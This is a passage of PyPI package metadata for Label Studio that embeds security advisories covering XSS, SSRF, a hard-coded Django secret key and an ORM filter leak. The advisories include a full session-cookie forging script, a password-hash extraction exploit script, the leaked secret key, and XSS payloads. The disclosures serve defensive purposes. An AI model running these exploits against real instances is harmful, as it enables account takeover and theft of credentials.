other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.7.5.post2":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.7.5.post2/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.19)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.7.5.post2","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"f8a5427448051a34327866f1a2b18bee58fb020cc652c3cf75ce868e1cf37bcc","md5":"cb1bbef34c96637f250697a7dbb1d121","sha256":"ed83900766bf2cbe47f81680b989dbe5ba451c78c9b97e76080741512899e0df"},"downloads":-1,"filename":"label_studio-0.7.5.post2-py3-none-any.whl","has_sig":false,"md5_digest":"cb1bbef34c96637f250697a7dbb1d121","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":10157377,"upload_time":"2020-10-15T10:10:44","upload_time_iso_8601":"2020-10-15T10:10:44.381495Z","url":"https://files.pythonhosted.org/packages/f8/a5/427448051a34327866f1a2b18bee58fb020cc652c3cf75ce868e1cf37bcc/label_studio-0.7.5.post2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"e66663beb700d869e3a8164674cf6ef838de5bd76579a54e12f47678be29a3aa","md5":"d75b8ffe6f3cb735fd27345c346a575f","sha256":"2bd9cb4186f6d5f708852ad53d69e4fad6a2cb23011ec30af7de060b3373969b"},"downloads":-1,"filename":"label-studio-0.7.5.post2.tar.gz","has_sig":false,"md5_digest":"d75b8ffe6f3cb735fd27345c346a575f","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":10097965,"upload_time":"2020-10-15T10:10:55","upload_time_iso_8601":"2020-10-15T10:10:55.796114Z","url":"https://files.pythonhosted.org/packages/e6/66/63beb700d869e3a8164674cf6ef838de5bd76579a54e12f47678be29a3aa/label-studio-0.7.5.post2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in 